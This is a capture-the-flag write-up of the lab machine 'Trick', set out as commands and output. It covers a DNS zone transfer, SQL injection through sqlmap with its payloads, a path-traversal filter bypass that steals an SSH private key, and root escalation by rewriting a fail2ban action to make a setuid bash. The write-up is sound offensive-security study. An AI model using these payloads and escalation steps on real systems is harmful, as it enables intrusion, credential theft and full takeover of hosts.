# Trick

```bash
TARGET=10.10.11.166
```

```bash
$ sudo nmap -p- --min-rate 10000 $TARGET      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 21:58 PDT
Warning: 10.10.11.166 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.166
Host is up (0.098s latency).
Not shown: 63133 closed tcp ports (reset), 2398 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http
```

```bash
$ sudo nmap -p 22,25,53,80 -sV -sC $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-05 22:00 PDT
Nmap scan report for 10.10.11.166
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.29 seconds
```

```bash
$ dig -p 53 -x 10.10.11.166 @10.10.11.166

; <<>> DiG 9.19.21-1-Debian <<>> -p 53 -x 10.10.11.166 @10.10.11.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24681
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 6fd5d9d5ea95e4da1d6b77cc6661483a2cb8c39f444b40f0 (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 84 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Wed Jun 05 22:25:14 PDT 2024
;; MSG SIZE  rcvd: 163
```

```bash
$ cat /etc/hosts | grep $TARGET
10.10.11.166    trick.htb trick
```

```bash
$ dig AXFR -p 53 @trick.htb trick.htb    

; <<>> DiG 9.19.21-1-Debian <<>> AXFR -p 53 @trick.htb trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 88 msec
;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
;; WHEN: Wed Jun 05 22:36:58 PDT 2024
;; XFR size: 6 records (messages 1, bytes 231)
```

```bash
$ cat /etc/hosts | grep $TARGET
10.10.11.166    preprod-payroll.trick.htb trick.htb trick
```

![Preprod Payroll](images/port_80_preprod-payroll.png)

```bash
$ curl -s preprod-payroll.trick.htb | grep "<title>"
  <title>Admin | Employee's Payroll Management System</title>
```

It seems `CVE-2022-28468` is referent a SQL Injection at `username` parameter on `Payroll Management System`.

![web search - Payroll Management System - CVE](images/search_payroll_management_system_cve.png)

## [CVE-2022-28468](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2022-28468) - Payroll Management System SQL Injection

![SQL Injection](images/port_80_sqli.png)

Interesting...

![User and pwd](images/port_80_preprod-payroll_user_n_pwd.png)

We have LFI here, but it seems to append `.php` at the end.

![LFI](images/port_80_preprod-payroll_page.png)

We could try to use `PHP Filters` to get some files.

```bash
php://filter/convert.base64-encode/resource=<FILE>
```

![Burp - LFI](images/port_80_preprod-payroll_lfi.png)

Save the encoded output to a file and decode it with `base64` command.

```bash
$ base64 -d login.b64                                                
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Admin | Employee's Payroll Management System</title>
 
<?php include('./header.php'); ?>
<?php include('./db_connect.php'); ?>
<?php 
session_start();
...
```

```bash
$ echo "PD9w...NCg0K" > db_connect.b64
$ base64 -d db_connect.b64 
<?php 

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

But this does not seem to be a valid ssh password.

```bash
$ ssh remo@$TARGET                                                         
remo@10.10.11.166's password: TrulyImpossiblePasswordLmao123
Permission denied, please try again.
```

Lets try explore the SQL injection with `sqlmap`. Back to the application we see that `ajax.php` is the page processing the login. We can save it on `Burp` to pass to `sqlmap`.

![Ajax Login](images/port_80_preprod-payroll_ajax_login_burp.png)

```bash
$ cat ajax-login.req 
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://preprod-payroll.trick.htb
Connection: close
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=3e252925j9elk56pjkdt3sfqv4

username=kali&password=kali
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --level 5 --risk 3
...
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=kali' OR NOT 8818=8818-- UmdJ&password=kali123

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=kali' OR (SELECT 9429 FROM(SELECT COUNT(*),CONCAT(0x71706a7671,(SELECT (ELT(9429=9429,1))),0x71787a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nHZN&password=kali123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=kali' AND (SELECT 3796 FROM (SELECT(SLEEP(5)))HacW)-- msGw&password=kali123
---
[08:17:07] [INFO] testing MySQL
[08:17:07] [INFO] confirming MySQL
[08:17:07] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
...
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --privileges
...
[08:19:54] [INFO] fetching database users privileges
[08:19:54] [INFO] resumed: ''remo'@'localhost''
[08:19:54] [INFO] resumed: 'FILE'
database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
...
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --file-read=/etc/passwd
...
[08:21:23] [INFO] fetching file: '/etc/passwd'

do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
[08:21:30] [INFO] retrieved: '2351'
[08:21:30] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (2351 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd (same file)

[08:21:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
...
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep  "/bash"
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --file-read=/etc/nginx/nginx.conf
...
[08:26:29] [INFO] fetching file: '/etc/nginx/nginx.conf'

do you want confirmation that the remote file '/etc/nginx/nginx.conf' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
[08:26:31] [INFO] retrieved: '1482'
[08:26:31] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf' and the remote file '/etc/nginx/nginx.conf' have the same size (1482 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file)

[08:26:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
...
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf      
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        ##
        # Basic Settings
        ##

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ##
        # SSL Settings
        ##

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}


#mail {
#       # See sample authentication script at:
#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
# 
#       # auth_http localhost/auth.php;
#       # pop3_capabilities "TOP" "USER";
#       # imap_capabilities "IMAP4rev1" "UIDPLUS";
# 
#       server {
#               listen     localhost:110;
#               protocol   pop3;
#               proxy      on;
#       }
# 
#       server {
#               listen     localhost:143;
#               protocol   imap;
#               proxy      on;
#       }
#}
```

```bash
$ sqlmap -r ajax-login.req --dbms=mysql --data='username=1' --file-read=/etc/nginx/sites-enabled/default
...
[08:30:16] [INFO] fetching file: '/etc/nginx/sites-enabled/default'

do you want confirmation that the remote file '/etc/nginx/sites-enabled/default' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
[08:30:19] [INFO] retrieved: '1058'
[08:30:19] [INFO] the local file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default' and the remote file '/etc/nginx/sites-enabled/default' have the same size (1058 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file)

[08:30:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
...
```

```bash
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

From the enabled sites we see that we have one more site available.

```bash
...
server_name preprod-marketing.trick.htb;
...
```

We also see that the 2 available sites seem to be running with different fastcgi. And the `preprod-marketing.trick.htb` seems to have some relation with the `michael` user.

```bash
...
server_name preprod-marketing.trick.htb;
root /var/www/market;
fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;

...

server_name preprod-payroll.trick.htb;
root /var/www/payroll;
fastcgi_pass unix:/run/php/php7.3-fpm.sock;
```

Let's add the new address on the `/etc/hosts` file.

```bash
$ cat /etc/hosts | grep $TARGET
10.10.11.166    preprod-marketing.trick.htb preprod-payroll.trick.htb trick.htb trick
```

## Local File Inclusion (LFI) - preprod-marketing.trick.htb

![LFI](images/port_80_preprod-mkt_lfi.png)

It seems we have a filter that removes `../`, but we can trick it adding `..././` for each level we want to return.

In other words `..././` is equivalent to `../`.

```bash
$ curl -s http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

```bash
$ curl -s http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ curl -s http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa > michael.key
```

```bash
$ chmod 600 michael.key
```

```bash
$ ssh -i michael.key michael@$TARGET                                                                    
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

```bash
michael@trick:~$ uname -a
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux

michael@trick:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

## Privilege Escalation - Fail2Ban

- [Good post about fail2ban priv escalation](https://juggernaut-sec.com/fail2ban-lpe/)

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

```bash
michael@trick:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf 
[sshd]
enabled = true
```

Our group `security` has priv on `action.d`.

```bash
michael@trick:~$ ls -lha /etc/fail2ban/
total 76K
drwxr-xr-x   6 root root     4.0K Jun 12 18:48 .
drwxr-xr-x 126 root root      12K Jun 12 15:22 ..
drwxrwx---   2 root security 4.0K Jun 12 18:48 action.d
-rw-r--r--   1 root root     2.3K Jun 12 18:48 fail2ban.conf
drwxr-xr-x   2 root root     4.0K Jun 12 18:48 fail2ban.d
drwxr-xr-x   3 root root     4.0K Jun 12 18:48 filter.d
-rw-r--r--   1 root root      23K Jun 12 18:48 jail.conf
drwxr-xr-x   2 root root     4.0K Jun 12 18:48 jail.d
-rw-r--r--   1 root root      645 Jun 12 18:48 paths-arch.conf
-rw-r--r--   1 root root     2.8K Jun 12 18:48 paths-common.conf
-rw-r--r--   1 root root      573 Jun 12 18:48 paths-debian.conf
-rw-r--r--   1 root root      738 Jun 12 18:48 paths-opensuse.conf
```

The `fail2ban` config on `sshd` seems to be the following:

```bash
michael@trick:~$ cat /etc/fail2ban/jail.conf | grep "^\[ssh" -A10
[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

```bash
michael@trick:~$ cat /etc/fail2ban/jail.conf | grep "^\[DEFAULT" -A35 | grep maxretry
# A host is banned if it has generated "maxretry" during the last "findtime"
# "maxretry" is the number of failures before a host get banned.
maxretry = 5
```

```bash
michael@trick:~$ cat /etc/fail2ban/jail.conf | grep "^\[DEFAULT" -A150 | grep banaction
banaction = iptables-multiport
banaction_allports = iptables-allports
...
```

```bash
michael@trick:~$ ls -lha /etc/fail2ban/action.d/
total 288K
drwxrwx--- 2 root security 4.0K Jun 12 19:12 .
drwxr-xr-x 6 root root     4.0K Jun 12 19:12 ..
...
-rw-r--r-- 1 root root     1.4K Jun 12 19:12 iptables-multiport.conf
...
```

```bash
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf.bkp
```

Edit the bkp file to replace the `actionban`.

```bash
michael@trick:~$ cat /tmp/iptables-multiport.conf.bkp | grep "actionban ="
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
```

```bash
michael@trick:~$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf
michael@trick:~$ cp /tmp/iptables-multiport.conf.bkp /etc/fail2ban/action.d/iptables-multiport.conf

michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.

michael@trick:~$ cat /etc/fail2ban/action.d/iptables-multiport.conf | grep "actionban ="
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
```

```bash
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 5 -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-12 12:20:37
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://10.10.11.166:22/
[ATTEMPT] target 10.10.11.166 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "princess" - 6 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "1234567" - 7 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "rockyou" - 8 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "12345678" - 9 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "abc123" - 10 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "nicole" - 11 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "daniel" - 12 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "babygirl" - 13 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "monkey" - 14 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "lovely" - 15 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "jessica" - 16 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "654321" - 17 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "michael" - 18 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "ashley" - 19 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "qwerty" - 20 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "111111" - 21 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "iloveu" - 22 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.11.166 - login "root" - pass "000000" - 23 of 14344399 [child 3] (0/0)
...
```

```bash
michael@trick:~$ ls -lha /tmp/bash
-rwsr-xr-x 1 root root 1.2M Jun 12 21:18 /tmp/bash
```

```bash
michael@trick:~$ /tmp/bash 
bash-5.0$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
bash-5.0$ exit
exit

michael@trick:~$ /tmp/bash -p
bash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
bash-5.0# whoami
root
```

We could now copy root `id_rsa` or add our key on the `authorized_keys`.

```bash
bash-5.0# ls -lha /root/.ssh/
total 20K
drwx------ 2 root root 4.0K May 25  2022 .
drwx------ 8 root root 4.0K Jun 12 15:23 ..
-rw-r--r-- 1 root root  392 Apr 22  2022 authorized_keys
-rw------- 1 root root 1.8K Apr 22  2022 id_rsa
-rw-r--r-- 1 root root  392 Apr 22  2022 id_rsa.pub
```

```bash
```

```bash
$ chmod 600 root.key
bash-5.0# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi
UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
$ ssh -i root.key root@$TARGET
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
...
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@trick:~# id
uid=0(root) gid=0(root) groups=0(root)
```
